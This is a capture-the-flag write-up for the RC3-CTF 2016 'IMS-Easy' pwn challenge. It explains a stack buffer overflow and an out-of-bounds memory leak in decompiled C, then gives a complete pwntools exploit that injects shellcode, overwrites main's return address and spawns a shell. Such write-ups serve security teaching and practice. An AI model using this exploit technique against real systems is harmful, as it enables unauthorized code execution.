<!DOCTYPE html>
<html lang="en">

    <?php
      include('../includes/headers.php');
      include('../includes/navbar.php');
      include('../includes/footers.php');
      print getHeaders('RC3-2016',1);
    ?>

<body>

    <!-- Navigation -->
    <?php
      print getNavbar(1);
    ?>

    <!-- Page Header -->
    <!-- Set your background image for this header on the line below. -->
    <header class="intro-header" >
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        <h1>RC3-CTF 2016</h1>
                        <h2><img src="../img/r3ctf.2016.logo2.png" width="60%" height="60%" alt="logo" align="right"></h2>
                        <span class="meta">Posted by <a href="#">kablaa</a> November, 2016</span>
                    </div>

                </div>
            </div>
        </div>
    </header>

    <!-- begn challenge list -->
    <div class="container">
        <div class = "row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <div class = "list-group">
                        <a href="#ims-easy" class = "list-group-item">IMS-Easy<span class ="badge">Pwn-150</span></a>
                    </div>
                </div>
        </div>
    </div>
    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="post-body col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1">
                    <h1 id="ims-easy">IMS-Easy (Pwn-150)</h1>
                    <p>
                      I thought this challenge was a lot of fun. First off, upon running the binary we are greeted with a menu:

                      <pre>
================================================
|RC3 Inventory Management System (public beta )|
================================================
1. Add record
2. Delete record
3. View record
4. Quit
Choose:
                      </pre>
                      So let's pop the hood on this bad boi.
                    </p>
                    <pre>
                      <code class="language-C">
int main(int argc, const char **argv, const char **envp)
{
      char product_list[68]; // [esp+1Ch] [ebp-44h]@1

      setbuf(stdout, 0);
      memset(product_list, 0, 60);
      while ( 1 )
      {
            print_menu();
            if ( process_choice(product_list, &ampnum_products) )
                  break;
            printf("There are %d records in the IMS\n\n", num_products);
      }
      return 0;  // can overwrite the ret addr of main
}
                      </code>
                    </pre>
                    <p>
                      There are a few important things to note here. We have a <code>product_list</code> buffer that is declared locally in <code>main</code>. We also seem to have a global variable <code>num_products</code>. The menu is printed and then those two variable are passed to a handling function. Let's take a look at the functionality of each option listed in the menu.
                    </p>
                    <pre>
                      <code class="language-C">
else if ( choice == 1 )  // add
{
      printf("Enter product ID: ");
      fgets(choice_buff, 12, stdin);
      destination = &ampproduct_list[12 * *num_products];
      *(destination + 2) = strtoul(choice_buff, 0, 10);
      printf("Enter product code: ");
      fgets(choice_buff, 12, stdin);
      end_of_string = strchr(choice_buff, '\n');
      if ( end_of_string )
            *end_of_string = 0;
      strncpy(&ampproduct_list[12 * *num_products], choice_buff, 8);
      ++*num_products;
      }
}
                      </code>
                    </pre>
                    <p>
                      Looking at the <i>add</i> functionality we start to get a feeling for how this program works. It looks like its using the <code>product_list</code> buffer declared in main as a list of products. Each product is kind of like a structure. Each struct is 12 bytes, and they are stored contiguously in the buffer. To clarify, these aren't actual C structs, but they are <i>implied</i> by the way this program seems to work. If they were actual C struct, I think they would look something like this:
                    </p>
                    <pre>
                      <code class="language-C">
struct Product{
      char product_code[8];
      int product_id;
}
                      </code>
                    </pre>
                    <p>
                      The <i>add</i> functionality seems to find the end of the product list and creates a new struct at the end. Do you see the problem here? There is no check to ensure that more bytes than 68 bytes are written! Running <code>checksec</code> on the binary reveals that there is no canary and also no restrictions on stack executions. So we have a classic buffer overflow! Now if only we had a memory leak...
                    </p>
                    <pre>
                      <code class="language-C">
if ( choice == 3 )  // view
{
      printf("Enter the index of the product you wish to view: ");
      fgets(choice_buff, 12, stdin);
      index = strtol(choice_buff, 0, 10);
      printf("Product ID: %d, Product Code: ", &ampproduct_list[12 * index + 8]);
      fwrite(&ampproduct_list[12 * index], 8, 1, stdout);// memory leak
      fflush(stdout);
}
                      </code>
                    </pre>
                    <p>
                      So this functionality will use the <code>index</code> supplied by the user to find the location of a product struct and print the 8 byte product code. However, there is no check on if the index is greater than the number of products, for that matter no check to even make sure the index is greater than zero! We have an 8 byte memory leak!
                    </p>
                    <p>
                      So our plan is this:

                      <ol>
                        <li> Leak a stack address with the <b>view</b> functionality and use it to calculate the address of the <code>product_list</code> buffer</li>
                        <li> Write our shellcode into the <code>product_list</code> buffer witht the <b>add</b> functionality</li>
                        <li> Overwrite thre return address of <code>main</code> with the address of our shellcode</li>
                        <li> Quit out of the program so that we return to our shellcode</li>
                        <li> Get dat flag</li>
                      </ol>
                      The hardest part of this challenge was getting the shellcode into the buffer. Each product was being treated like a struct, so I had to break my shellocde up into sections, convert parts of it to integers and write the other parts as strings. It took me quite a while, but here is my <code>easy.py</code>
                    </p>


                    <pre>
                      <code class="language-python">
from pwn import *
import string
bin_name = "IMS-easy"
elf = ELF(bin_name)
#context.log_level='debug'

shellcode = shellcraft.i386.linux.sh()
shellcode = asm(shellcode)

sc_len = len(shellcode)
# our shellcode is 22 bytes long
#8 bytes
first = shellcode[:8]
#4 bytes
second = shellcode[8:12]
#8 bytes
third = shellcode[12:20]
#last 4 bytes
fourth = shellcode[20:sc_len] + "\x90"*(24 - sc_len )

p = process(bin_name)
def send_data(data):
    p.recv()
    p.sendline(data)

log.info("leaking address")
send_data("3")
p.sendline("7")
p.recvuntil("Code: ")
#recieving 4 bytes of junk
p.recv(4)
data = p.recv(4)
leaked_addr = u32(data)
log.success("got leaked addr: " + hex(leaked_addr))
log.info("calculating offset")
offset = -84 - 132
shellcode_addr =  leaked_addr + offset
log.success("shellcode located at: " + hex(shellcode_addr))

#write shellcode to memory
log.info("writing shellcode to memory")
send_data("1")
send_data(str(u32(second)))
send_data(first)

send_data("1")
send_data(str(u32(fourth)))
send_data(third)
log.success("shellcode written")
#filling the rest of the buffer untill we get to the ret addr
for i in range(0,4):
    send_data("1")
    send_data(str(0x90909090))
    send_data("\x90"*8)

#return  to shellcode
log.info("overwriting ret addr")
send_data("1")
send_data(str(shellcode_addr))
send_data("JUNKJUNK")
log.success("ret addr overwritten")

log.success("returning")
send_data("4")
p.interactive()
                      </code>
                    </pre>
                </div>
            </div>
        </div>
    </article>

    <hr>

    <!-- Footer -->
<?php
      print getFooters();
?>


</body>

</html>
